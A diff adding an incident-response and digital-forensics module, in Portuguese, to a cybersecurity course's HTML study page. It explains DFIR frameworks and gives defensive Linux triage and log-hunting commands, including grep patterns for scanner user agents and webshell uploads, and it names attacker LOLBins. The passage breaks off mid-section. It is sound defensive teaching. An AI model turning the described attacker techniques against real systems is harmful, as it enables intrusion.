@@ -371,7 +371,7 @@
     <span class="lbl">Provas</span>
     <button class="pbtn" data-prova="provaA" type="button">Prova A <span class="st">Enterprise Security</span></button>
     <button class="pbtn active" data-prova="provaB" type="button">Prova B <span class="st">Security Assessment</span></button>
-    <button class="pbtn" data-prova="provaC" type="button">Prova C <span class="st">em breve</span></button>
+    <button class="pbtn" data-prova="provaC" type="button">Prova C <span class="st">Incident Response</span></button>
     <button class="pbtn" data-prova="provaD" type="button">Prova D <span class="st">em breve</span></button>
     <button class="pbtn" data-prova="provaE" type="button">Prova E <span class="st">em breve</span></button>
     <button class="pbtn" data-prova="provaF" type="button">Prova F <span class="st">em breve</span></button>
@@ -3050,8 +3050,968 @@ local stratum 10                  <span class="c"># fallback local se perder int
 </div><!-- /#provaA -->
 
 <div class="prova-content" id="provaC">
-  <div class="provaempty"><div class="big">🅲</div><h2>Prova C</h2><p>Conteúdo em construção. Me diga o tema desta prova que eu monto as abas e os comandos.</p><span class="tag">em breve</span></div>
+<header>
+  <div class="wrap">
+    <div class="brand"><span class="dot"></span> Cyber SENAI Porto · Instrutor Rafael Reis · Prova C — Incident Response &amp; Forensics</div>
+    <h1>Resposta a Incidentes &amp; Forense Digital: <span class="g">detectar, investigar e conter</span></h1>
+    <p class="sub">Guia completo de DFIR e operações de SOC (Linux, Windows, Rede/PCAP, SIEM e Memória/Disco). Domine os conceitos de cadeia de custódia e análise de intrusão, pratique cada técnica e resolva incidentes completos dentro da plataforma.</p>
+
+    <div class="aprog" id="cProg">
+      <span>🎯 Progresso nos treinos práticos: <b id="cProgTxt">0 / 30</b></span>
+      <span class="bar"><i id="cProgBar"></i></span>
+    </div>
+
+    <div class="atabs" id="ctabs">
+      <div class="atab active" data-cp="c-fund"><span class="ic">📚</span> Fundamentos</div>
+      <div class="atab" data-cp="c-linux"><span class="ic">🐧</span> IR Linux</div>
+      <div class="atab" data-cp="c-win"><span class="ic">🪟</span> IR Windows</div>
+      <div class="atab" data-cp="c-net"><span class="ic">🌐</span> Rede, PCAP &amp; SIEM</div>
+      <div class="atab" data-cp="c-forense"><span class="ic">🧬</span> Memória &amp; Disco</div>
+      <div class="atab" data-cp="c-tools"><span class="ic">🧰</span> Ferramentas</div>
+      <div class="atab" data-cp="c-provas"><span class="ic">📝</span> Provas</div>
+    </div>
+  </div>
+</header>
+
+<div class="wrap">
+
+<!-- ===================== C · FUNDAMENTOS ===================== -->
+<div class="apanel active" id="c-fund">
+  <div class="disc" style="margin-top:4px">📚 Enquanto a <b>Prova A</b> previne ataques (Hardening) e a <b>Prova B</b> encontra vulnerabilidades (Assessment), a <b>Prova C</b> ensina o que fazer <b>quando o ataque acontece</b>: preservar evidências voláteis, reconstruir cada passo do invasor em logs/rede/memória, conter a ameaça sem destruir provas e produzir um relatório técnico irrefutável.</div>
+
+  <div class="mgroup" style="margin-top:24px"><span class="d"></span>1 · Conceitos-chave de DFIR &amp; SOC <span style="font-size:11px;color:var(--mut2);text-transform:none;letter-spacing:0">— clique em cada card para aprofundar</span></div>
+  <div class="gloss">
+    <div class="gi click popc" data-t="Evento vs. Alerta vs. Incidente">
+      <b>Evento × Alerta × Incidente</b> — diferenciar ruído de ataque real. <span class="more">ⓘ detalhes</span>
+      <div class="gx">• <b>Evento:</b> qualquer ocorrência registrada em um sistema ou rede (ex.: um login bem-sucedido, uma conexão DNS).<br>• <b>Alerta:</b> aviso disparado por uma regra (SIEM/IDS/EDR) apontando atividade suspeita.<br>• <b>Incidente:</b> evento ou conjunto de alertas confirmados que violam políticas de segurança ou comprometem Confidencialidade, Integridade ou Disponibilidade.<br><br><b>Papel do analista:</b> fazer a triagem rápida para descartar falsos positivos e responder imediatamente aos incidentes reais.</div>
+    </div>
+    <div class="gi click popc" data-t="IOC vs. IOA (Indicadores)">
+      <b>IOC × IOA</b> — rastros estáticos vs. comportamento em curso. <span class="more">ⓘ detalhes</span>
+      <div class="gx">• <b>IOC (Indicator of Compromise):</b> evidência técnica deixada pelo ataque — hash SHA-256 de um arquivo malicioso, IP de C2, domínio malicioso, chave de registro ou caminho de webshell.<br>• <b>IOA (Indicator of Attack):</b> sequência comportamental que revela um ataque em andamento mesmo sem malware conhecido (ex.: o processo do servidor web invocando um shell e consultando contas privilegiadas).</div>
+    </div>
+    <div class="gi click popc" data-t="Ordem de Volatilidade (RFC 3227)">
+      <b>Ordem de Volatilidade</b> — coletar primeiro o que se perde rápido. <span class="more">ⓘ detalhes</span>
+      <div class="gx">Segundo a <b>RFC 3227</b>, evidências digitais devem ser coletadas da mais efêmera para a mais persistente:<br>1. Registradores/cache de CPU<br>2. <b>Memória RAM</b>, conexões de rede ativas, tabela ARP e processos em execução<br>3. Sistemas de arquivos temporários (<code class="inl">/tmp</code>, swap)<br>4. <b>Disco rígido</b> e logs locais<br>5. Logs remotos (SIEM/LogServer) e mídias de backup<br><br><b>Erro fatal:</b> desligar ou reiniciar um servidor invadido antes de coletar RAM e conexões apaga provas cruciais!</div>
+    </div>
+    <div class="gi click popc" data-t="Cadeia de Custódia &amp; Hashing Forense">
+      <b>Cadeia de Custódia</b> — provar que a evidência não foi adulterada. <span class="more">ⓘ detalhes</span>
+      <div class="gx">A <b>Cadeia de Custódia</b> documenta quem coletou, transportou, armazenou e analisou cada evidência, com datas e assinaturas.<br><br>Tecnicamente, a integridade é garantida gerando o <b>hash criptográfico (SHA-256)</b> imediatamente na aquisição da imagem/arquivo e trabalhando <b>sempre sobre uma cópia</b> (montada em modo somente leitura <code class="inl">ro,noexec</code>), mantendo o original intacto.</div>
+    </div>
+    <div class="gi click popc" data-t="Triagem Ao Vivo (Live Triage) vs. Post-Mortem">
+      <b>Live Triage × Post-Mortem</b> — máquina ligada vs. imagem de disco. <span class="more">ⓘ detalhes</span>
+      <div class="gx">• <b>Live Triage:</b> coleta rápida e cirúrgica com o sistema ainda ligado para identificar processos ativos, sessões de rede, memória RAM e conter um ataque em andamento sem tirar sistemas críticos do ar.<br>• <b>Forense Post-Mortem (Dead Box):</b> análise profunda sobre imagem bit-a-bit do disco e dump de memória em estação isolada, recuperando arquivos deletados e linha do tempo completa.</div>
+    </div>
+    <div class="gi click popc" data-t="Persistência &amp; Living-off-the-Land (LOLBins)">
+      <b>Persistência &amp; LOLBins</b> — como invasores sobrevivem e se camuflam. <span class="more">ⓘ detalhes</span>
+      <div class="gx"><b>Persistência</b> é o mecanismo deixado para manter acesso após reboot ou troca de senha (cron jobs, chaves SSH, serviços, tarefas agendadas, chaves Run no Registro).<br><br><b>Living-off-the-Land (LOLBins / GTFOBins):</b> uso de ferramentas nativas e assinadas do próprio SO (<code class="inl">powershell</code>, <code class="inl">certutil</code>, <code class="inl">curl</code>, <code class="inl">python</code>, <code class="inl">tar</code>) para executar ações maliciosas sem gravar antivírus tradicional — por isso auditar argumentos de linha de comando é essencial.</div>
+    </div>
+    <div class="gi click popc" data-t="C2, Beaconing &amp; Exfiltração">
+      <b>C2, Beaconing &amp; Exfiltração</b> — sinais do invasor no tráfego de rede. <span class="more">ⓘ detalhes</span>
+      <div class="gx">• <b>C2 (Command &amp; Control):</b> servidor externo usado pelo invasor para comandar o host infectado.<br>• <b>Beaconing:</b> conexões periódicas regulares (ex.: a cada 60s com pequeno jitter) do host interno para o C2 perguntando se há novas tarefas.<br>• <b>Exfiltração:</b> retirada de dados sensíveis por HTTP POST, upload em nuvem, SFTP ou camuflada em consultas DNS (<i>DNS Tunneling</i>).</div>
+    </div>
+    <div class="gi click popc" data-t="Timeline Forense &amp; Padronização UTC">
+      <b>Timeline &amp; UTC</b> — reconstruir a história exata do incidente. <span class="more">ⓘ detalhes</span>
+      <div class="gx">Em um incidente envolvendo firewall, servidor Linux, estação Windows e SIEM, cada equipamento pode estar em um fuso horário diferente.<br><br><b>Regra profissional:</b> converta e registre <b>todos os eventos em UTC (ISO 8601)</b> na linha do tempo mestre, cobrindo: <i>Paciente Zero / Acesso Inicial → Execução → Persistência → Movimento Lateral → Exfiltração → Contenção</i>.</div>
+    </div>
+    <div class="gi click popc" data-t="Verdadeiro / Falso Positivo e Negativo">
+      <b>TP / FP / TN / FN</b> — precisão na triagem de alertas do SOC. <span class="more">ⓘ detalhes</span>
+      <div class="gx">• <b>Verdadeiro Positivo (TP):</b> alerta disparou e realmente há atividade maliciosa.<br>• <b>Falso Positivo (FP):</b> alerta disparou para uma ação legítima (ex.: script de admin).<br>• <b>Falso Negativo (FN):</b> o mais perigoso — ataque ocorreu e nenhum alerta disparou (exige <i>Threat Hunting</i> proativo!).<br>• <b>Verdadeiro Negativo (TN):</b> tráfego normal sem alerta.</div>
+    </div>
+    <div class="gi click popc" data-t="Contenção sem Destruir Evidências">
+      <b>Contenção Cirúrgica</b> — parar o sangramento preservando provas. <span class="more">ⓘ detalhes</span>
+      <div class="gx">Conter é impedir que o ataque se espalhe ou exfiltre mais dados. Divida em:<br>• <b>Curto prazo:</b> isolar a VLAN/host no firewall/EDR, bloquear IP de C2 no perímetro, suspender conta comprometida (<code class="inl">usermod -L</code> / <code class="inl">Disable-ADAccount</code>).<br>• <b>Longo prazo / Erradicação:</b> coletar evidências + hashes primeiro, depois remover persistência, corrigir a vulnerabilidade de entrada e restaurar de backup limpo se necessário.</div>
+    </div>
+    <div class="gi click popc" data-t="Pirâmide da Dor (Pyramid of Pain)">
+      <b>Pirâmide da Dor</b> — qual indicador custa mais caro para o atacante trocar. <span class="more">ⓘ detalhes</span>
+      <div class="gx">Criada por David Bianco, classifica indicadores do mais fácil ao mais difícil para o adversário alterar:<br>1. Valores de Hash (trivial mudar 1 byte)<br>2. Endereços IP (fácil trocar VPS/proxy)<br>3. Nomes de Domínio<br>4. Artefatos de Rede/Host (User-Agent, caminhos)<br>5. Ferramentas<br>6. <b>TTPs (Táticas, Técnicas e Procedimentos)</b> — detectar o comportamento obriga o invasor a reinventar todo o método!</div>
+    </div>
+    <div class="gi click popc" data-t="SIEM, EDR, NDR &amp; Métricas (MTTD / MTTR)">
+      <b>SIEM, EDR, NDR &amp; Métricas</b> — arquitetura moderna de detecção. <span class="more">ⓘ detalhes</span>
+      <div class="gx">• <b>SIEM (Splunk, Elastic, Wazuh):</b> centraliza e correlaciona logs de toda a empresa.<br>• <b>EDR:</b> visibilidade profunda e isolamento em endpoints (processos, memória).<br>• <b>NDR / IDS (Zeek, Suricata):</b> visibilidade no tráfego de rede.<br>• <b>MTTD / MTTR:</b> <i>Mean Time to Detect</i> (tempo médio para detectar) e <i>Mean Time to Respond</i> (tempo médio para conter/recuperar) — principais indicadores de maturidade de um SOC.</div>
+    </div>
+  </div>
+
+  <div class="mgroup" style="margin-top:26px"><span class="d"></span>2 · Frameworks, normas e padrões de investigação</div>
+  <p style="color:var(--mut2);font-size:12px;margin:0 0 6px">clique em cada padrão para aprofundar</p>
+  <div class="stdgrid two">
+    <div class="std popc" data-t="NIST SP 800-61 (Rev. 2 &amp; Rev. 3 / CSF 2.0)"><div class="sh"><span class="ab">NIST 800-61</span><span class="full">Computer Security Incident Handling Guide</span><span class="more">ⓘ</span></div><p>Referência mundial para ciclo de vida de resposta a incidentes e integração ao CSF 2.0.</p>
+      <div class="gx">Na versão clássica (<b>Rev. 2</b>), define 4 fases: <b>1. Preparação → 2. Detecção e Análise → 3. Contenção, Erradicação e Recuperação → 4. Atividade Pós-Incidente</b>.<br><br>Na <b>Rev. 3</b>, alinha-se continuamente ao <b>NIST CSF 2.0</b> (<i>Govern, Identify, Protect, Detect, Respond, Recover</i>), enfatizando que as lições aprendidas devem retroalimentar imediatamente regras de SIEM, playbooks e controles de hardening.</div>
+    </div>
+    <div class="std popc" data-t="SANS PICERL (Incident Handler's Handbook)"><div class="sh"><span class="ab">PICERL</span><span class="full">Metodologia de 6 Fases da SANS</span><span class="more">ⓘ</span></div><p>Divide operacionalmente contenção, erradicação e recuperação em etapas distintas.</p>
+      <div class="gx">As 6 etapas do <b>PICERL</b>:<br>1. <b>P</b>reparation (ferramentas, logs, playbooks)<br>2. <b>I</b>dentification (triagem, escopo, paciente zero)<br>3. <b>C</b>ontainment (isolar sem destruir provas)<br>4. <b>E</b>radication (remover persistência e corrigir causa-raiz)<br>5. <b>R</b>ecovery (retomar produção com monitoramento reforçado)<br>6. <b>L</b>essons Learned (relatório final e melhoria contínua).</div>
+    </div>
+    <div class="std popc" data-t="RFC 3227 &amp; ISO/IEC 27037"><div class="sh"><span class="ab">ISO 27037</span><span class="full">&amp; RFC 3227 — Evidências Digitais</span><span class="more">ⓘ</span></div><p>Normas para identificação, coleta, aquisição e preservação forense.</p>
+      <div class="gx">A <b>RFC 3227</b> estabelece a ordem de volatilidade e boas práticas de coleta ao vivo, enquanto a <b>ISO/IEC 27037</b> padroniza internacionalmente o manuseio de evidências digitais (auditabilidade, repetibilidade e justificativa técnica caso a coleta ao vivo altere parte do estado da memória).</div>
+    </div>
+    <div class="std popc" data-t="MITRE ATT&amp;CK &amp; Cyber Kill Chain"><div class="sh"><span class="ab">ATT&amp;CK</span><span class="full">&amp; Cyber Kill Chain na Investigação</span><span class="more">ⓘ</span></div><p>Mapear cada evidência encontrada à tática e técnica usada pelo invasor.</p>
+      <div class="gx">Em relatórios de resposta a incidentes de alto nível (e provas WorldSkills), cada achado é classificado pela tática/técnica do <b>MITRE ATT&amp;CK</b> — por exemplo: Força Bruta (<code class="inl">T1110</code>), Agendamento via Cron (<code class="inl">T1053.003</code>), PowerShell (<code class="inl">T1059.001</code>) ou Exfiltração sobre C2 (<code class="inl">T1041</code>).</div>
+    </div>
+    <div class="std popc" data-t="Regras YARA (Caça a Artefatos)"><div class="sh"><span class="ab">YARA</span><span class="full">Pattern Matching para Forense &amp; Threat Hunting</span><span class="more">ⓘ</span></div><p>O "canivete suíço" para identificar arquivos e processos maliciosos por padrões.</p>
+      <div class="gx"><b>YARA</b> permite escrever regras baseadas em cadeias de texto, sequências hexadecimais e condições lógicas (ex.: tamanho do arquivo, cabeçalho ELF/MZ + strings de C2) para varrer discos e dumps de memória RAM localizando webshells e malwares da mesma família.</div>
+    </div>
+    <div class="std popc" data-t="Regras Sigma (Detecção Universal em Logs)"><div class="sh"><span class="ab">SIGMA</span><span class="full">Generic Signature Format for SIEM Systems</span><span class="more">ⓘ</span></div><p>O equivalente ao YARA/Snort, mas feito para logs de qualquer SIEM.</p>
+      <div class="gx">Uma regra <b>Sigma</b> é escrita em YAML descrevendo o evento malicioso (ex.: <code class="inl">EventID: 4688</code> com <code class="inl">CommandLine</code> contendo <code class="inl">-enc</code>) e pode ser convertida automaticamente para consultas <b>Splunk SPL</b>, <b>Elastic KQL</b> ou <b>Wazuh</b>.</div>
+    </div>
+  </div>
+
+  <div class="mgroup" style="margin-top:26px"><span class="d"></span>3 · Visão visual — Ciclo de Resposta a Incidentes &amp; Ordem de Volatilidade</div>
+  <div class="vfig">
+    <svg viewBox="0 0 880 175" xmlns="http://www.w3.org/2000/svg" font-family="system-ui,monospace">
+      <defs><marker id="ca1" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#38bdf8"/></marker></defs>
+      <rect x="14" y="18" width="150" height="135" rx="10" fill="#10243a" stroke="#38bdf8"/>
+      <text x="89" y="42" fill="#38bdf8" font-size="11" font-weight="700" text-anchor="middle">1. PREPARAÇÃO</text>
+      <text x="89" y="66" fill="#e3ebf6" font-size="10.5" text-anchor="middle">Logs &amp; NTP ativos</text>
+      <text x="89" y="86" fill="#97a6c0" font-size="10" text-anchor="middle">SIEM / Sysmon / auditd</text>
+      <text x="89" y="106" fill="#97a6c0" font-size="10" text-anchor="middle">Kit forense &amp; hashes</text>
+      <text x="89" y="126" fill="#97a6c0" font-size="10" text-anchor="middle">Playbooks prontos</text>
+
+      <line x1="164" y1="85" x2="188" y2="85" stroke="#38bdf8" stroke-width="2" marker-end="url(#ca1)"/>
+
+      <rect x="194" y="18" width="166" height="135" rx="10" fill="#2a220e" stroke="#fbbf24"/>
+      <text x="277" y="42" fill="#fbbf24" font-size="11" font-weight="700" text-anchor="middle">2. DETECÇÃO &amp; TRIAGEM</text>
+      <text x="277" y="66" fill="#e3ebf6" font-size="10.5" text-anchor="middle">Coleta Volátil (RAM/Rede)</text>
+      <text x="277" y="86" fill="#97a6c0" font-size="10" text-anchor="middle">Escopo &amp; Paciente Zero</text>
+      <text x="277" y="106" fill="#97a6c0" font-size="10" text-anchor="middle">Extrair IOCs &amp; Timeline</text>
+      <text x="277" y="126" fill="#97a6c0" font-size="10" text-anchor="middle">Preservar c/ SHA-256</text>
+
+      <line x1="360" y1="85" x2="384" y2="85" stroke="#38bdf8" stroke-width="2" marker-end="url(#ca1)"/>
+
+      <rect x="390" y="18" width="154" height="135" rx="10" fill="#2a1115" stroke="#f87171"/>
+      <text x="467" y="42" fill="#f87171" font-size="11" font-weight="700" text-anchor="middle">3. CONTENÇÃO</text>
+      <text x="467" y="66" fill="#e3ebf6" font-size="10.5" text-anchor="middle">Isolar host / bloquear C2</text>
+      <text x="467" y="86" fill="#97a6c0" font-size="10" text-anchor="middle">Travar conta invadida</text>
+      <text x="467" y="106" fill="#97a6c0" font-size="10" text-anchor="middle">Sem apagar evidências!</text>
+      <text x="467" y="126" fill="#97a6c0" font-size="10" text-anchor="middle">Parar exfiltração</text>
+
+      <line x1="544" y1="85" x2="568" y2="85" stroke="#38bdf8" stroke-width="2" marker-end="url(#ca1)"/>
+
+      <rect x="574" y="18" width="142" height="135" rx="10" fill="#0e2a20" stroke="#36d399"/>
+      <text x="645" y="42" fill="#36d399" font-size="11" font-weight="700" text-anchor="middle">4. ERRADICAÇÃO</text>
+      <text x="645" y="66" fill="#e3ebf6" font-size="10.5" text-anchor="middle">Remover persistência</text>
+      <text x="645" y="86" fill="#97a6c0" font-size="10" text-anchor="middle">Corrigir brecha raiz</text>
+      <text x="645" y="106" fill="#97a6c0" font-size="10" text-anchor="middle">Rotacionar segredos</text>
+      <text x="645" y="126" fill="#97a6c0" font-size="10" text-anchor="middle">Restaurar limpo</text>
+
+      <line x1="716" y1="85" x2="740" y2="85" stroke="#38bdf8" stroke-width="2" marker-end="url(#ca1)"/>
+
+      <rect x="746" y="18" width="120" height="135" rx="10" fill="#241c3a" stroke="#a78bfa"/>
+      <text x="806" y="42" fill="#a78bfa" font-size="11" font-weight="700" text-anchor="middle">5. PÓS-IR</text>
+      <text x="806" y="66" fill="#e3ebf6" font-size="10.5" text-anchor="middle">Relatório RCA</text>
+      <text x="806" y="86" fill="#97a6c0" font-size="10" text-anchor="middle">Timeline UTC</text>
+      <text x="806" y="106" fill="#97a6c0" font-size="10" text-anchor="middle">Novas regras</text>
+      <text x="806" y="126" fill="#97a6c0" font-size="10" text-anchor="middle">Hardening</text>
+    </svg>
+    <div class="cap">Regra de ouro: colete e hasheie evidências voláteis ANTES de matar processos, apagar arquivos ou reiniciar máquinas.</div>
+  </div>
+
+  <div class="mgroup" style="margin-top:26px"><span class="d"></span>4 · As 5 perguntas que toda investigação precisa responder</div>
+  <div class="flow">
+    <div class="st"><div class="n">QUEM / ORIGEM</div><b>Atribuição técnica</b><div class="d">IPs de origem, User-Agents, contas utilizadas e infraestrutura de C2.</div></div>
+    <div class="st"><div class="n">COMO ENTROU</div><b>Vetor inicial</b><div class="d">força bruta, falha web, phishing, credencial vazada ou serviço exposto.</div></div>
+    <div class="st"><div class="n">QUANDO</div><b>Linha do tempo (UTC)</b><div class="d">primeiro contato, momento do comprometimento, persistência e saída.</div></div>
+    <div class="st"><div class="n">O QUE FEZ</div><b>Escopo &amp; Persistência</b><div class="d">comandos executados, escalonamento, movimento lateral e backdoors deixadas.</div></div>
+    <div class="st"><div class="n">QUAL IMPACTO</div><b>Dados &amp; Negócio</b><div class="d">houve exfiltração, adulteração ou indisponibilidade? Como conter e evitar repetição?</div></div>
+  </div>
+
+  <div class="mgroup" style="margin-top:26px"><span class="d"></span>5 · Trilhas práticas — clique para avançar</div>
+  <div class="owl">
+    <div class="owi jumpcard" data-cjump="c-linux"><span class="c" style="color:var(--acc)">🐧</span><div class="t"><b>IR &amp; Logs Linux</b><div class="d">auth.log/secure, logs web, processos ocultos (/proc), persistência (cron/SSH/systemd), auditd e contenção.</div></div></div>
+    <div class="owi jumpcard" data-cjump="c-win"><span class="c" style="color:var(--acc2)">🪟</span><div class="t"><b>IR &amp; Logs Windows</b><div class="d">Event IDs (4624/4625/4688/4720/7045/1102/4104), Sysmon, Registro/Tarefas, artefatos de disco e contenção.</div></div></div>
+    <div class="owi jumpcard" data-cjump="c-net"><span class="c" style="color:var(--warn)">🌐</span><div class="t"><b>Rede, PCAP &amp; SIEM</b><div class="d">Wireshark/tshark, scans, fluxos HTTP, DNS Tunneling, Beaconing C2, consultas Splunk/Kibana e análise de Phishing.</div></div></div>
+    <div class="owi jumpcard" data-cjump="c-forense"><span class="c" style="color:var(--info)">🧬</span><div class="t"><b>Memória, Disco &amp; Artefatos</b><div class="d">Aquisição bit-a-bit + SHA-256, Volatility 3, Sleuth Kit/Autopsy, triagem estática, desofuscação e YARA/Sigma.</div></div></div>
+    <div class="owi jumpcard" data-cjump="c-provas"><span class="c" style="color:var(--crit)">📝</span><div class="t"><b>Arena de Provas Simuladas (3 Incidentes)</b><div class="d">Investigue logs, rede e artefatos sem sair da plataforma, extraia os IOCs e entregue o Relatório de Incidente!</div></div></div>
+  </div>
 </div>
+
+<!-- ===================== C · IR & LOGS LINUX ===================== -->
+<div class="apanel" id="c-linux">
+  <div class="filters" id="cf-linux">
+    <span class="pill on" data-f="all">Todos</span>
+    <span class="pill" data-f="auth">Logs &amp; Auth</span>
+    <span class="pill" data-f="proc">Processos &amp; Rede</span>
+    <span class="pill" data-f="pers">Persistência</span>
+    <span class="pill" data-f="audit">Arquivos &amp; Audit</span>
+    <span class="pill" data-f="cont">Contenção</span>
+  </div>
+  <div class="count" id="cc-linux"></div>
+
+  <div class="disc" style="border-color:var(--acc);background:#0e1f1a">
+    🚀 <b>Coleta rápida de triagem ao vivo em Linux (somente leitura — preserva evidências):</b>
+<pre style="margin-top:8px"><span class="k">date</span> -u; <span class="k">uptime</span>; <span class="k">w</span>                             <span class="c"># horário UTC atual e quem está logado agora</span>
+<span class="k">ss</span> -tupna                                       <span class="c"># conexões ativas + PID do processo responsável</span>
+<span class="k">ps</span> auxf                                         <span class="c"># árvore completa de processos (pai → filho)</span>
+<span class="k">ls</span> -la /tmp /var/tmp /dev/shm                   <span class="c"># pastas preferidas p/ largar scripts/binários</span>
+<span class="k">last</span> -aiF | head -15                            <span class="c"># últimos logins com IP de origem no fim</span></pre>
+  </div>
+
+  <!-- 1 Auth logs -->
+  <div class="v" data-cat="auth">
+    <div class="top"><div class="ttl"><h3><span class="os lin">LOGS</span>Logs de autenticação: força bruta, conta invadida e uso de sudo</h3><div class="cat">/var/log/auth.log (Debian/Ubuntu) · /var/log/secure (RHEL/CentOS) · journalctl</div></div><div class="chev">›</div></div>
+    <div class="body">
+      <div class="blk"><div class="h what"><span class="d"></span>O que é / o que procurar</div>
+        <p>Toda tentativa de login SSH, troca de usuário (<code>su</code>), comando com <code>sudo</code> e criação de conta (<code>useradd</code>) fica registrada nos logs de autenticação. Em um incidente, procure o padrão clássico: <b>centenas de <code>Failed password</code></b> de um mesmo IP seguidas de um <b><code>Accepted password</code></b> (ou <code>Accepted publickey</code>) — esse é o exato segundo em que o atacante entrou.</p></div>
+      <div class="blk"><div class="h find"><span class="d"></span>Como investigar</div>
+<pre><span class="c"># Ranking de IPs que mais falharam senha no SSH:</span>
+<span class="k">grep</span> "Failed password" /var/log/auth.log /var/log/secure 2&gt;/dev/null | <span class="k">awk</span> '{print $(NF-3)}' | <span class="k">sort</span> | <span class="k">uniq</span> -c | <span class="k">sort</span> -nr | head
+
+<span class="c"># Ver exatamente quem conseguiu logar e de qual IP:</span>
+<span class="k">grep</span> -E "Accepted (password|publickey)" /var/log/auth.log /var/log/secure 2&gt;/dev/null
+
+<span class="c"># Auditar comandos sudo e criação de contas backdoor:</span>
+<span class="k">grep</span> -E "sudo:|useradd|usermod" /var/log/auth.log /var/log/secure 2&gt;/dev/null</pre></div>
+      <div class="interp"><div class="rr">
+        <div class="r safe"><span class="lab">🟢 Estado normal</span>Logins apenas de IPs de gerência conhecidos, em horário esperado, sem rajadas de falhas prévias.</div>
+        <div class="r vuln"><span class="lab">🔴 Indicador de invasão</span>450 <code>Failed password</code> de IP externo seguidos de <code>Accepted password for deploy</code> + <code>useradd</code> logo depois.</div>
+      </div></div>
+      <button class="trainbtn" data-clab="ir-lin-auth" type="button">🎮 Treinar</button>
+    </div>
+  </div>
+
+  <!-- 2 last / lastb -->
+  <div class="v" data-cat="auth">
+    <div class="top"><div class="ttl"><h3><span class="os lin">SESSÕES</span>Registros binários de sessão (last, lastb, lastlog e w)</h3><div class="cat">/var/log/wtmp · /var/log/btmp · /var/log/lastlog</div></div><div class="chev">›</div></div>
+    <div class="body">
+      <div class="blk"><div class="h what"><span class="d"></span>O que é / por que importa</div>
+        <p>Mesmo quando um invasor edita logs em texto puro, muitas vezes esquece dos arquivos binários de sessão: <code>wtmp</code> (lido por <code>last</code>), <code>btmp</code> (tentativas falhas, lido por <code>lastb</code>) e <code>lastlog</code>. Se esses arquivos estiverem com tamanho zero ou truncados, isso por si só já prova adulteração intencional (<i>Defense Evasion</i>).</p></div>
+      <div class="blk"><div class="h find"><span class="d"></span>Como investigar</div>
+<pre><span class="k">w</span>                                <span class="c"># sessões interativas abertas neste exato momento</span>
+<span class="k">last</span> -aiF | head -20             <span class="c"># logins bem-sucedidos com timestamps completos e IP</span>
+<span class="k">lastb</span> -aiF | head -20            <span class="c"># falhas de autenticação registradas no btmp</span>
+<span class="k">lastlog</span> | <span class="k">grep</span> -v "Never"        <span class="c"># contas de sistema (ex.: www-data) que nunca deveriam ter login!</span></pre></div>
+      <div class="interp"><div class="rr">
+        <div class="r safe"><span class="lab">🟢 Estado normal</span>Apenas administradores humanos aparecem no <code>lastlog</code>; contas de serviço marcam <code>**Never logged in**</code>.</div>
+        <div class="r vuln"><span class="lab">🔴 Indicador de invasão</span>Conta de serviço (<code>apache</code>, <code>postgres</code>) com login recente ou sessão ativa de IP desconhecido em <code>still logged in</code>.</div>
+      </div></div>
+      <button class="trainbtn" data-clab="ir-lin-last" type="button">🎮 Treinar</button>
+    </div>
+  </div>
+
+  <!-- 3 Web logs -->
+  <div class="v" data-cat="auth">
+    <div class="top"><div class="ttl"><h3><span class="os lin">WEB LOGS</span>Investigação em logs de servidor Web (access.log e error.log)</h3><div class="cat">detectar scanners, SQLi/LFI, upload malicioso e uso de webshell</div></div><div class="chev">›</div></div>
+    <div class="body">
+      <div class="blk"><div class="h what"><span class="d"></span>O que é / o que procurar</div>
+        <p>Quando o vetor inicial é uma aplicação pública, toda a história da invasão fica em <code>/var/log/httpd/</code> ou <code>/var/log/nginx/</code>. Procure: picos de erros <code>404/500</code> (reconhecimento/fuzzing), parâmetros suspeitos codificados em URL, um <b><code>POST</code> retornando <code>200/201</code> seguido de vários <code>GET/POST</code> para um arquivo novo em <code>/uploads/</code></b> (sinal clássico de webshell!).</p></div>
+      <div class="blk"><div class="h find"><span class="d"></span>Como investigar</div>
+<pre><span class="c"># Top IPs com maior volume de requisições:</span>
+<span class="k">awk</span> '{print $1}' /var/log/httpd/access_log | <span class="k">sort</span> | <span class="k">uniq</span> -c | <span class="k">sort</span> -nr | head
+
+<span class="c"># Caçar acessos bem-sucedidos (HTTP 200) em pastas de upload ou arquivos suspeitos:</span>
+<span class="k">grep</span> -E "(/uploads/|/tmp/|\.php\?)" /var/log/httpd/access_log | <span class="k">grep</span> " 200 "
+
+<span class="c"># Identificar User-Agents de ferramentas automatizadas (sqlmap, gobuster, curl, nikto):</span>
+<span class="k">awk</span> -F'"' '{print $6}' /var/log/httpd/access_log | <span class="k">sort</span> | <span class="k">uniq</span> -c | <span class="k">sort</span> -nr | head</pre></div>
+      <div class="interp"><div class="rr">
+        <div class="r safe"><span class="lab">🟢 Estado normal</span>Requisições distribuídas para rotas previstas da aplicação, sem execução de scripts em pastas de mídia.</div>
+        <div class="r vuln"><span class="lab">🔴 Indicador de invasão</span><code>POST /upload.php 200</code> seguido de repetidos acessos <code>200</code> a <code>/uploads/avatar.php</code> pelo mesmo IP externo.</div>
+      </div></div>
+      <button class="trainbtn" data-clab="ir-lin-web" type="button">🎮 Treinar</button>
+    </div>
+  </div>
+
+  <!-- 4 Processos, /proc e Conexões -->
+  <div class="v" data-cat="proc">
+    <div class="top"><div class="ttl"><h3><span class="os lin">MEMÓRIA AO VIVO</span>Processos anômalos, binários apagados (/proc) e conexões C2</h3><div class="cat">ps auxf · ss -tupn · lsof · /proc/&lt;PID&gt;/exe (deleted)</div></div><div class="chev">›</div></div>
+    <div class="body">
+      <div class="blk"><div class="h what"><span class="d"></span>O que é / por que importa</div>
+        <p>Atacantes costumam executar um binário malicioso a partir de <code>/tmp</code> ou <code>/dev/shm</code> e apagá-lo em seguida para não aparecer no <code>ls</code>. Porém, enquanto o processo estiver rodando, o kernel mantém o executável acessível em <b><code>/proc/&lt;PID&gt;/exe</code></b> marcado como <code>(deleted)</code> — de onde o perito consegue copiá-lo e extrair o hash antes de encerrar o processo!</p></div>
+      <div class="blk"><div class="h find"><span class="d"></span>Como investigar</div>
+<pre><span class="c"># Cruzar conexões externas ESTABLISHED com o PID/programa responsável:</span>
+<span class="k">ss</span> -tupn | <span class="k">grep</span> ESTAB
+
+<span class="c"># Achar processos cujo binário foi deletado do disco (técnica clássica de evasão):</span>
+<span class="k">ls</span> -la /proc/*/exe 2&gt;/dev/null | <span class="k">grep</span> "(deleted)"
+
+<span class="c"># Recuperar o binário direto da memória ANTES de matar o processo:</span>
